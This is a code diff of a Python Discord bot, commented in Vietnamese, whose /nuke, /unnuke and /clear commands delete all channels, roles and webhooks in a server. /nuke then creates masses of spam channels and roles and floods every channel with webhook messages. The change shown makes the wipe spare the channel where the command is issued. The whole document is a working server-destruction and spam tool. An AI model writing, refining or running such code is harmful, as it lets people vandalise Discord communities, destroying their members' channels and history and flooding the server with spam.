@@ -1,4 +1,4 @@
-# bot.py - Nuke với Webhook Spam siêu tốc
+# bot.py - Nuke with Webhook Spam, giữ lại kênh dùng lệnh
 import discord
 from discord import app_commands
 from discord.ext import commands
@@ -25,32 +25,39 @@ class NukeCommands(commands.Cog):
         self.role_count = 100
         self.spam_per_channel = 10
 
-    @app_commands.command(name='nuke', description='🔥 Nuke server - tạo kênh, role, spam webhook')
+    @app_commands.command(name='nuke', description='🔥 Nuke server - giữ kênh dùng lệnh, tạo kênh, role, spam webhook')
     @app_commands.default_permissions(administrator=True)
     async def slash_nuke(self, interaction: discord.Interaction):
         await interaction.response.send_message('🔥 **NUKE STARTED** 🔥', ephemeral=False)
         guild = interaction.guild
+        current_channel = interaction.channel  # Kênh đang dùng lệnh
 
-        # Xóa sạch
-        await interaction.channel.send('🗑️ Cleaning...')
-        await self.delete_all_channels(guild)
-        await self.delete_all_roles(guild)
-        await self.delete_all_webhooks(guild)
+        # Xóa các kênh khác (trừ kênh hiện tại)
+        await interaction.channel.send('🗑️ Deleting other channels...')
+        deleted = await self.delete_all_channels_except(guild, current_channel)
+        await interaction.channel.send(f'✅ Deleted {deleted} channels')
 
-        # Tạo kênh và role
-        await interaction.channel.send(f'📝 Creating {self.channel_count} channels...')
+        # Xóa role và webhook
+        await interaction.channel.send('🗑️ Deleting roles and webhooks...')
+        deleted_roles = await self.delete_all_roles(guild)
+        deleted_webhooks = await self.delete_all_webhooks(guild)
+        await interaction.channel.send(f'✅ Deleted {deleted_roles} roles, {deleted_webhooks} webhooks')
+
+        # Tạo kênh mới (vẫn giữ kênh hiện tại)
+        await interaction.channel.send(f'📝 Creating {self.channel_count} new channels...')
         created = await self.create_spam_channels(guild)
         await interaction.channel.send(f'✅ Created {created} channels')
 
+        # Tạo role spam
         await interaction.channel.send(f'👑 Creating {self.role_count} roles...')
         created_roles = await self.create_spam_roles(guild)
         await interaction.channel.send(f'✅ Created {created_roles} roles')
 
-        # Chờ cache sync
+        # Đợi cache sync
         await interaction.channel.send('⏳ Syncing channels...')
         await asyncio.sleep(5)
 
-        # SPAM BẰNG WEBHOOK - siêu nhanh
+        # Spam bằng webhook (trên tất cả kênh, bao gồm kênh hiện tại)
         await interaction.channel.send('💬 Spamming via webhooks...')
         spammed = await self.spam_via_webhooks(guild)
         await interaction.channel.send(f'✅ Sent {spammed} messages')
@@ -64,29 +71,33 @@ class NukeCommands(commands.Cog):
         embed.add_field(name='💬 Webhook Spam', value=f'{spammed:,}', inline=True)
         await interaction.channel.send(embed=embed)
 
-    @app_commands.command(name='unnuke', description='🧹 Xóa kênh và role')
+    @app_commands.command(name='unnuke', description='🧹 Xóa tất cả kênh (trừ kênh hiện tại) và role')
     @app_commands.default_permissions(administrator=True)
     async def slash_unnuke(self, interaction: discord.Interaction):
         await interaction.response.send_message('🧹 Unnuke...', ephemeral=False)
         guild = interaction.guild
-        deleted = await self.delete_all_channels(guild)
+        current_channel = interaction.channel
+        deleted = await self.delete_all_channels_except(guild, current_channel)
         deleted_roles = await self.delete_all_roles(guild)
         await interaction.channel.send(f'✅ Deleted {deleted} channels, {deleted_roles} roles')
 
-    @app_commands.command(name='clear', description='🗑️ Xóa tất cả')
+    @app_commands.command(name='clear', description='🗑️ Xóa tất cả kênh, role, webhook (trừ kênh hiện tại)')
     @app_commands.default_permissions(administrator=True)
     async def slash_clear(self, interaction: discord.Interaction):
         await interaction.response.send_message('🗑️ Clearing...', ephemeral=False)
         guild = interaction.guild
-        d1 = await self.delete_all_channels(guild)
+        current_channel = interaction.channel
+        d1 = await self.delete_all_channels_except(guild, current_channel)
         d2 = await self.delete_all_roles(guild)
         d3 = await self.delete_all_webhooks(guild)
         await interaction.channel.send(f'✅ Deleted {d1} channels, {d2} roles, {d3} webhooks')
 
-    # ---------- HÀM XÓA ----------
-    async def delete_all_channels(self, guild):
+    # ---------- HÀM XÓA (GIỮ KÊNH HIỆN TẠI) ----------
+    async def delete_all_channels_except(self, guild, keep_channel):
         count = 0
         for channel in guild.channels:
+            if channel.id == keep_channel.id:
+                continue
             try:
                 await channel.delete()
                 count += 1
